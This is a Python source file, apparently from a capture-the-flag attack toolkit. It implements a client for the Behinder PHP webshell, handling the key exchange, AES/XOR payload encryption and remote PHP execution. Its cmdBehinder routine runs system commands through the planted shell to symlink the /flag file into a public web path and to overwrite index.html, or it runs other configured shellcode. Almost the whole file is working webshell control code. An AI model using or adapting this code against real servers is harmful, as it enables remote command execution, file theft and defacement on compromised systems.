from Crypto.Cipher import AES
from base64 import *
import requests
from config.MemShellConfig import *
from code.CmdColor import *
import re
class AES128Encryptor(object):
    def __init__(self, key):
        self._key = self._padding_zero(key)

    def encrypt(self, msg) -> str:
        enc = AES.new(self._key, AES.MODE_CBC, b'\x00' * 16)
        return b64encode(enc.encrypt(self._padding_pkcs5(msg))).decode()

    def _padding_pkcs5(self, msg) -> bytes:
        if isinstance(msg, str):
            msg = msg.encode()

        if len(msg) == 0x10:
            return msg + b'\x10' * 0x10
        return msg + (
            0x10 - len(msg) % 0x10) * chr(0x10 - len(msg) % 0x10).encode()

    def _padding_zero(self, key) -> bytes:
        output = list(key)
        while len(output) % 16:
            output.append('\x00')

        return ''.join(output).encode()


class WebShellConnector(object):
    TIMEOUT = 3

    def __init__(self, url, pwd, lang='php', is_behinder=True):
        self._url = url
        self._pwd = pwd
        self._lang = lang
        self._is_behinder = is_behinder

        if is_behinder:
            self._behinder_key_exchange()

    def _behinder_key_exchange(self):
        self._session = requests.Session()
        r = self._session.get(
            self._url, params={self._pwd: '1'}, timeout=self.TIMEOUT)

        self._behinder_key = r.text[:16]
        self._aes_encryptor = AES128Encryptor(self._behinder_key)

        # identity = _random_str()
        identity = 'y3m01ihacky'
        r = self._session.post(
            self._url,
            timeout=self.TIMEOUT,
            data=self._behinder_aes_encrypt(f'|print_r("{identity}");'))
        if identity in r.text:
            self._enc_way = 'aes'
        else:
            self._enc_way = 'xor'

    def _behinder_xor_encrypt(self, msg) -> str:
        output = []
        for i in range(0, len(msg)):
            output.append(
                chr(ord(msg[i]) ^ ord(self._behinder_key[((i + 1) & 15)])))

        return b64encode(''.join(output).encode()).decode()

    def _behinder_aes_encrypt(self, msg) -> str:
        return self._aes_encryptor.encrypt(msg)

    def _exec_php(self, cmd) -> str:
        if self._is_behinder:
            data = ('|@ini_set("display_errors","0");'
                    '@set_time_limit(0);'
                    f'{cmd}//')

            if self._enc_way == 'aes':
                data = self._behinder_aes_encrypt(data)
            elif self._enc_way == 'xor':
                data = self._behinder_xor_encrypt(data)
            else:
                pass

        else:
            #...
            pass

        try:
            if self._is_behinder:
                r = self._session.post(
                    self._url, data=data, timeout=self.TIMEOUT)
                return r.content.decode(errors='ignore')
            else:
                #...
                pass

        except (requests.exceptions.RequestException,
                requests.exceptions.ConnectionError):
            pass




def cmdBehinder(behindPath='',passwd='',softLink=SoftLink):

    try:
        if softLink==True:
            linkName = f"chocol{softLinkRand()}.css"
            softLink_shellcode = f"""system('ln -s /flag {SoftLinkPath}{linkName}');file_put_contents('{SoftLinkPath}index.html','');"""
            ip = re.findall(r"//((.*?):(.*?))/", behindPath)[0][0]
            webSoftLink = f"{webshell_method}://{ip}{WebSoftLinkPath}{linkName}"
            printRed(f"{ip}->{webSoftLink}")
            try:
                insert_softLink(ip,webSoftLink)
            except:
                printRed("[-]插入数据库错误")
            behind = WebShellConnector(behindPath, passwd)
            try:
                result = behind._exec_php(softLink_shellcode)
                if result:
                    printGreen(f"[+]{behindPath}->{result}")
                else:
                    printYellow(f"[+]{behindPath}->[no output]")
            except:
                printRed('[-]err')
        else:
            behind = WebShellConnector(behindPath, passwd)
            try:
                result = behind._exec_php(final_shellcode)
                if result:
                    printGreen(f"[+]{behindPath}->{result}")
                else:
                    printYellow(f"[+]{behindPath}->[no output]")
            except:
                printRed('[-]err')

    except:
        pass